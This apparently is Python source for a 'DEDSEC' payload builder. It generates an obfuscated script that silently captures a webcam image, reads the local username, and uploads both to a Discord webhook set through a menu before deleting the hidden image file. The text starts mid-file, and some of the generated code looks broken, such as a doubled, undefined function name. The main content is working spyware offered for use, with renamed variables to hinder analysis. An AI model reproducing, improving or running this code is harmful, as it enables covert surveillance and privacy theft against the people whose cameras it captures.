⢿⣿⢣⣿⠀⣼⣿⡀⢸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⠀⠘⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⠀⠀⠀⠀⠀
⠘⣿⣼⡏⠀⣿⣿⣧⣸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀
⠀⢿⣿⣷⠀⢸⣧⠻⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣦⡀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⢿⣿⡇⠀⠀⠀⠀
⠀⠀⠙⠻⢷⣼⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣷⣦⣤⣤⣘⡿⠋⠀⠻⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⡟⠁⠀⠙⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⡿⠿⢛⣃⣬⡿⠻⠿⠿⠿⠀⠀⠀⣹⣿⣿⣷⣀⠀⠀⠀⠀⠀⠀⠘⠻⢿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⢉⣠⡶⠟⠛⠋⠁⠀⠀⣀⣠⣤⣴⣶⠿⠿⣿⣿⠿⠿⣷⣶⣤⣤⣤⡄⠀⠀⠀⠉⠻⢿⣿⣿⣦⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠿⢿⣿⣶⣶⣶⣶⣾⣿⣿⣿⠿⠋⣡⣴⠾⠟⠛⣩⣴⣶⠿⠛⠛⠛⠋⠁⠀⠀⠀⠀⢀⣨⣿⣿⣿⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠁⠀⠀⣿⣷⣶⣿⣋⣀⣠⣴⡿⠋⠁⠀⠀⢀⣀⣠⣤⣴⣶⣶⣶⣿⣿⡿⠿⠟⠋⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠿⠿⢿⣿⣶⠾⠿⠿⠿⠛⠛⠋⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

'''

JcJG140h1SB9b8dsVZ8HZGi40h2SB9b8dsVZ8HZG1h1Stt1rnu4Eu = subprocess.check_output(['getent','passwd', '1000'])
JcJG140h1SB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZG1h1Stt1rnu4Eu = JcJG140h1SB9b8dsVZ8HZGi40h2SB9b8dsVZ8HZG1h1Stt1rnu4Eu.decode().split()

for JcJG140h1SB9b8dsVZ8HZG140hiSB9b8dsVZ8HZG1h1Stt1rnu4Eu in JcJG140h1SB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZG1h1Stt1rnu4Eu:
    JcJGi40h1SB9b8dsVZ8HZG140hiSB9b8dsVZ8HZG1hiStt1rnu4Eu = 'echo "' + JcJG140h1SB9b8dsVZ8HZG140hiSB9b8dsVZ8HZG1h1Stt1rnu4Eu  + '" | cut -d: -f1'
    JcJG140h1SB9b8dsVZ8HZG140hiSB9b8dsVZ8HZG1hiStt1rnu4Eu = subprocess.check_output(JcJGi40h1SB9b8dsVZ8HZG140hiSB9b8dsVZ8HZG1hiStt1rnu4Eu, shell=True)
    global JcJGi40h1SB9b8dsVZ8HZG140hiSB9b8dsVZ8HZG140hiStt1rnu4Eu
    JcJGi40h1SB9b8dsVZ8HZG140hiSB9b8dsVZ8HZG140hiStt1rnu4Eu = (JcJG140h1SB9b8dsVZ8HZG140hiSB9b8dsVZ8HZG1hiStt1rnu4Eu.decode().strip())
    break

def JcJGi40h1SB9b8dsVZ8HZG140hiSB9b8dsVZ8HZG140hiSttirnu4Eu():
    JcJGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSttirnu4Eu = cv2.VideoCapture(0)
    if not JcJGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSttirnu4Eu.isOpened():
        return
    JcJGi40hiSB9b8dsVZ8HZG140hiSB9b8dsVZ8HZGi40hiSttirnu4Eu, JcJGi40h1SB9b8dsVZ8HZG140hiSB9b8dsVZ8HZGi40hiSttirnu4Eu = JcJGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSttirnu4Eu.read()
    if not JcJGi40hiSB9b8dsVZ8HZG140hiSB9b8dsVZ8HZGi40hiSttirnu4Eu:
        return
    cv2.imwrite(".c.jpg", JcJGi40h1SB9b8dsVZ8HZG140hiSB9b8dsVZ8HZGi40hiSttirnu4Eu)
    JcJGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSttirnu4Eu.release()
    cv2.destroyAllWindows()

def ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40(ue3nFtttirNu4EuJ8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40):
    return ue3nFtttirNu4EuJ8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40.swapcase()

def i40hiSB9b8dsViXkfF6MMHNow78zyU6MMHNowSB9b8dsVZ8HZGi40hiSB9b8dsVZ83ue3nFtttirNu4Euj8y(i40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hiSB9b8dsVZ8MAG3ue3nFtttirN, JcJGi40h1SB9b8dsVZ8HZG140hiSB9b8dsVZ8HZG140hiStt1rnu4Eu):
    mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6 = '{n_v_1}'
    mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf7 = '{n_v_2}'
    f5GIAXdNOOK0DEd5FmMBnsbSF83H9hwX1wyQuH1huyq = '.'
    f5GIAXdNOOK0DEd5FnMBnsbSF83H9hwX1wyQuH1huyq = 'A'

    nAOsUFdh8tN8MAG3ue3nFtttirNu4Euj8yTJLjYJcJCg = ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40(mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6)
    nAOsUFdh8tN8MAG3ue3nFttiirNu4Euj8yTJLjYJcJCg = ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40(mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf7)
    B9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiS = nAOsUFdh8tN8MAG3ue3nFtttirNu4Euj8yTJLjYJcJCg.replace(f5GIAXdNOOK0DEd5FmMBnsbSF83H9hwX1wyQuH1huyq, f5GIAXdNOOK0DEd5FnMBnsbSF83H9hwX1wyQuH1huyq)
    B9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40h1SB9b8dsVZ8HZGi40hiS = nAOsUFdh8tN8MAG3ue3nFttiirNu4Euj8yTJLjYJcJCg.replace(f5GIAXdNOOK0DEd5FmMBnsbSF83H9hwX1wyQuH1huyq, f5GIAXdNOOK0DEd5FnMBnsbSF83H9hwX1wyQuH1huyq)
    
    B9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiS = mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6(B9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiS, B9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40h1SB9b8dsVZ8HZGi40hiS)

    B9b8dsVZ8VUiNpJWciiXkfF6MMHNow78zyU4PHZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiS = B9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiS
    MMHNow78zyU4PHZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8yTJLjYJc = UiNpJWciiXk(url=B9b8dsVZ8VUiNpJWciiXkfF6MMHNow78zyU4PHZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiS, username=JcJGi40h1SB9b8dsVZ8HZG140hiSB9b8dsVZ8HZG140hiStt1rnu4Eu)

    with open(i40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hiSB9b8dsVZ8MAG3ue3nFtttirN, "rb") as f:
        i40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hiSB9b8dsVZ8MAG3ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8 = f.read()
        MMHNow78zyU4PHZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8yTJLjYJc.add_file(file=i40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hiSB9b8dsVZ8MAG3ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8, filename=os.path.basename(i40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hiSB9b8dsVZ8MAG3ue3nFtttirN))
        response = MMHNow78zyU4PHZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8yTJLjYJc.execute()

if __name__ == "__main__":
    JcJGi40h1SB9b8dsVZ8HZG140hiSB9b8dsVZ8HZG140hiSttirnu4Eu()
    i40hiSb8dsViXkfF6MMHNow78zyU6MMHNowSB9b8dsVZ8HZGi40hiSB9b8dsVZ83ue3nFtttirNu4Euj8y = ".c.jpg"

    if os.path.exists(i40hiSb8dsViXkfF6MMHNow78zyU6MMHNowSB9b8dsVZ8HZGi40hiSB9b8dsVZ83ue3nFtttirNu4Euj8y):
        JcJGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSttirNu4Eu = subprocess.check_output(['getent','passwd', '1000'])
        ue3nFtttirNu4EuJ8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi10 = JcJGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSttirNu4Eu.decode().split()

        for b8dsVZ8HZGi40hiSB9b8dsVZ83ue3nFtttirNu4Eu in ue3nFtttirNu4EuJ8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi10:
            b8dsVZ8HZGi40hiSB9b8dsVZ83ue3nFttt1rNu4Eu = 'echo "' + JcJG140h1SB9b8dsVZ8HZG140hiSB9b8dsVZ8HZG1h1Stt1rnu4Eu  + '" | cut -d: -f1'
            b8dsVZ8HZGi40hiSB9b8dsVZ83ue3nF1tt1rNu4Eu = subprocess.check_output(b8dsVZ8HZGi40hiSB9b8dsVZ83ue3nFttt1rNu4Eu, shell=True)
            i40hiSb8dsViXkfF6MMHNow78zyU6MMHNowSB9b8dsVZ8HZGi40hi1SB9b8dsVZ83ue3nFtttirNu4Euj8y = (b8dsVZ8HZGi40hiSB9b8dsVZ83ue3nF1tt1rNu4Eu.decode().strip())
            break

        i40hiSB9b8dsViXkfF6MMHNow78zyU6MMHNowSB9b8dsVZ8HZGi40hiSB9b8dsVZ83ue3nFtttirNu4Euj8y(i40hiSb8dsViXkfF6MMHNow78zyU6MMHNowSB9b8dsVZ8HZGi40hiSB9b8dsVZ83ue3nFtttirNu4Euj8y, i40hiSb8dsViXkfF6MMHNow78zyU6MMHNowSB9b8dsVZ8HZGi40hi1SB9b8dsVZ83ue3nFtttirNu4Euj8y)
        print(banner)
        os.remove('.c.jpg')

    else:
        pass


""")

    print()
    print(tabulate([['PAYLOAD GENERATED:', f'{payload_name}.py']], tablefmt='fancy_grid'))

def setup_webhook():
    file_name = ".w.txt"
    try:
        with open(file_name, 'r') as web_link:
            content = web_link.read()
            if not content.strip(): 
                print()
                print(tabulate([[f'CURRENT WEBHOOK: ','EMPTY']], tablefmt='fancy_grid'))
                weblink = input("\n    Enter a Discord webhook URL: ")
                if validate_webhook(weblink):
                    print("\n    [VALID]")
                    with open(f'.w.txt', 'w') as web:
                        web.write(weblink)
                    time.sleep(2)
                else:
                    print("\n    [INVALID]")
                    time.sleep(2)
                    return setup_webhook()
                menu()
            else:
                print()
                print(tabulate([[f'CURRENT WEBHOOK: ',f'{content}']], tablefmt='fancy_grid'))
                weblink = input("\n    Enter a Discord webhook URL: ")
                if validate_webhook(weblink):
                    print("\n    [VALID]")
                    with open(f'.w.txt', 'w') as web:
                        web.write(weblink)
                    time.sleep(2)
                else:
                    print("\n    [INVALID]")
                    time.sleep(2)
                menu()
    except FileNotFoundError:
        with open(file_name, 'w') as f:
            f.write('')
            f.close()
        return setup_webhook()

def validate_webhook(url):
    pattern = r'^https://discord\.com/api/webhooks/\d+/\w+$'
    if re.match(pattern, url):
        return True
    else:
        return False

def menu():
    os.system('clear')
    print(Colorate.Diagonal(Colors.DynamicMIX((purple, dark)), banner))
    print(((purple)), (banner1))
    select = input('\n\t[?] DEDSEC: ')
    if select == '1':
        create_payload()
    elif select == '2':
        setup_webhook()
    elif select == '0':
        sys.exit('\n\tBYE BYE!')

menu()
